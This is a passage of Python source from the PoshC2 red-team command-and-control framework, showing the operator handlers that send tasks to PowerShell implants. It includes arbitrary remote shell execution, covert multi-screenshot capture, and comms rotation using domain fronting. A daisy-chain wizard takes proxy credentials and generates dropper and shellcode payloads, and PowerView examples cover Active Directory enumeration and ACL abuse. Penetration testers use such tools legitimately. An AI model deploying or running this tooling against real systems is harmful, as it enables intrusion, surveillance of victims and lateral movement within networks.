    params = re.compile("reversedns ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = f"[System.Net.Dns]::GetHostEntry(\"{params}\")"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_enable_rotation(user, command, implant_id):
    """
    Enables comms rotation across multiple URLs.

    Prompts the operator for a list of URLs to use, then an lists of
    HTTP Host headers. There is a 1-to-1 relationship between the lists
    and they must be the same size.

    Examples:
        enable-rotation
    """
    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
    cmd = f"set-variable -name rotdf -value {domainfront}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    cmd = f"set-variable -name rotate -value {domain}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_rotation(user, command, implant_id):
    """
    Retrieves the lists of URLs and HTTP Host headers in use for comms
    rotation.

    Examples:
        get-rotation
    """
    new_task = NewTask(
        implant_id=implant_id,
        command="get-variable -name rotdf",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    new_task = NewTask(
        implant_id=implant_id,
        command="get-variable -name rotate",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_shell(user, command, implant_id):
    """
    Runs a command directly on the PowerShell shell.

    If a command is not recognised by PoshC2, this is the default action.

    Examples:
        shell get-process | select name,cpu | sort-object cpu -Descending
        get-process | select name,cpu | sort-object cpu -Descending
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_multi_screenshot(user, command, implant_id):
    """
    Gets multiple screenshots over a defined period, one screenshot per beacon.

    Examples:
        get-multi-screenshot -timedelay 10 -quantity 30
    """
    pwrStatus = get_power_status(implant_id)

    if pwrStatus is not None and pwrStatus.screen_locked:
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")

        if ri.lower() == "n" or ri.lower() == "":
            return

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stop_multi_screenshot(user, command, implant_id):
    """
    Stops an existing get-multi-screenshot task.

    Examples:
        stop-multi-screenshot
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_screenshot_allwindows(user, command, implant_id):
    """
    Gets a screenshot of all windows on the the current desktop.

    Examples:
        get-screenshot-allwindows
    """
    pwrStatus = get_power_status(implant_id)

    if pwrStatus is not None and pwrStatus.screen_locked:
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")

        if ri.lower() == "n" or ri.lower() == "":
            return

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_screenshot(user, command, implant_id):
    """
    Gets a screenshot of the current desktop across all displays.

    Examples:
        get-screenshot
    """
    pwrStatus = get_power_status(implant_id)

    if pwrStatus is not None and pwrStatus.screen_locked:
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")

        if ri.lower() == "n" or ri.lower() == "":
            return

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_get_powerstatus(user, command, implant_id):
    """
    Gets the PowerStatus of the target host.

    Examples:
        get-powerstatus
    """
    get_powerstatus(implant_id)


@command(commands, commands_help, examples, block_help)
def do_load_powerstatus(user, command, implant_id):
    """
    Load the PowerStatus monitoring into this implant for this host.

    Examples:
        load-powerstatus
    """
    update_object(Implant, {Implant.label: "PSM"}, {Implant.id: implant_id})
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_start_daisy(user, command, implant_id):
    """
    Run a wizard to start daisy chaining, optionally creating new daisy payloads.

    Examples:
        start-daisy
    """
    check_module_loaded("invoke-daisychain.ps1", implant_id, user)
    elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)
    domain_front = ""
    proxy_username = ""
    proxy_password = ""
    proxy_url = ""
    credential_expiry = ""

    if elevated.lower() == "n":
        cont = input(
            Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)

        if cont.lower() == "n" or cont == "":
            return

        bind_ip = "localhost"
    else:
        bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)

    bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
    default_df_header = get_first_domainfront_header(DomainFrontHeader)

    if default_df_header == default_url:
        default_df_header = None

    if firstdaisy.lower() == "y" or firstdaisy == "":
        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
        domain_front = input(
            Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
        proxy_username = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
        proxy_password = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
        credential_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")

        if not upstream_url:
            upstream_url = default_url

        if not domain_front:
            if default_df_header:
                domain_front = default_df_header
            else:
                domain_front = ""
    else:
        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
        upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"

    command = f"invoke-daisychain -daisyserver http://{bind_ip} -port {bind_port} -c2server {upstream_url}"

    if domain_front:
        command = command + f" -domfront {domain_front}"

    if proxy_url:
        command = command + f" -proxyurl '{proxy_url}'"

    if proxy_username:
        command = command + f" -proxyuser '{proxy_username}'"

    if proxy_password:
        command = command + f" -proxypassword '{proxy_password}'"

    if elevated.lower() == "y" or elevated == "":
        firewall = input(Colours.GREEN + "Add firewall rule? (uses netsh.exe) y/N: ")

        if firewall.lower() == "n" or firewall == "":
            command = command + " -nofwrule"
    else:
        print_good("Not elevated so binding to localhost and not adding firewall rule")
        command = command + " -localhost"

    urls = f"{select_first(C2Server.urls)},{select_first(C2Server.socks_urls)}"
    command = command + f" -urls '{urls}'"
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "DAISY"}, {Implant.id: implant_id})
    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")

    if createpayloads.lower() == "y" or createpayloads == "":
        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)
        host_implant = get_implant(implant_id)
        powershell_proxy_command = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
        c2_server = select_first(C2Server)
        url = URL(
            name=name,
            url=f"http://{bind_ip}:{bind_port}",
            host_header="",
            proxy_url=proxy_url,
            proxy_username=proxy_username,
            proxy_password=proxy_password,
            credential_expiry=credential_expiry
        )

        insert_object(url)

        if url.id:
            new_payload = Payloads(
                c2_server.kill_date,
                c2_server.encryption_key,
                c2_server.insecure,
                c2_server.user_agent,
                c2_server.referer,
                f"{get_new_implant_url()}?d",
                PayloadsDirectory,
                url_id=url.id,
                powershell_proxy_command=powershell_proxy_command
            )

            new_payload.ps_dropper = new_payload.ps_dropper.replace(f"$pid;{upstream_url}",
                                                                    f"$pid;{host_implant.user}@{host_implant.domain}")
            new_payload.create_droppers(f"{name}_")
            new_payload.create_raw(f"{name}_")
            new_payload.create_shellcode(f"{name}_")
            new_payload.create_donut_shellcode(f"{name}_")
            new_payload.create_dynamic_payloads(f"{name}_")
            print_good(f"Created new {name} daisy payloads")


@command(commands, commands_help, examples, block_help)
def do_help(user, command, implant_id):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_command_help(command, commands, commands_help, block_help)


@command(commands, commands_help, examples, block_help)
def do_search_help(user, command, implant_id):
    """
    Search the command list for commands containing the keyword.

    The search is case insensitive.
    The -verbose option will search within and print the help for each command also.

    Examples:
        search-help psexec
        search-help -verbose psexec
    """
    search_help(command, commands_help)


@command(commands, commands_help, examples, block_help)
def do_powerview(user, command, implant_id):
    """
    Runs a command in PowerView, ensuring that PowerView.ps1 is loaded into memory.

    If the module has already been loaded then cmdlets can just be run directly.

    Examples:
        get-objectacl -resolveguids -samaccountname john
        add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
        get-netuser -admincount | select samaccountname
        get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
        get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
        get-netgroup -admincount | select samaccountname
        get-netgroupmember "domain admins" -recurse|select membername
        get-netcomputer | select-string -pattern "citrix"
        get-netcomputer -filter operatingsystem=*7*|select name
        get-netcomputer -filter operatingsystem=*2008*|select name
        get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
        get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
        get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
        get-netgroup | select-string -pattern "internet"
        get-netuser -filter | select-object samaccountname,userprincipalname
        get-netuser -filter samaccountname=test
        get-netuser -filter userprinciplename=test@test.com
        get-netgroup | select samaccountname
        get-netgroup "*ben*" | select samaccountname
        get-netgroupmember "domain admins" -recurse|select membername
        get-netshare hostname
        get-netdomain | get-netdomaincontroller | get-netforestdomain
        get-netforest | get-netforesttrust
        get-netuser -domain child.parent.com -filter samaccountname=test
        get-netgroup -domain child.parent.com | select samaccountname
        get-domaingpouserlocalgroupmapping -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
        get-domaingpouserlocalgroupmapping -LocalGroup RDP -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
        get-netdomaincontroller | select name | get-netsession | select *username,*cname
        get-dfsshare | get-netsession | select *username,*cname
        get-netfileserver | get-netsession | select *username,*cname
    """
    command = command[9:].strip()
    check_module_loaded("powerview.ps1", implant_id, user)
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
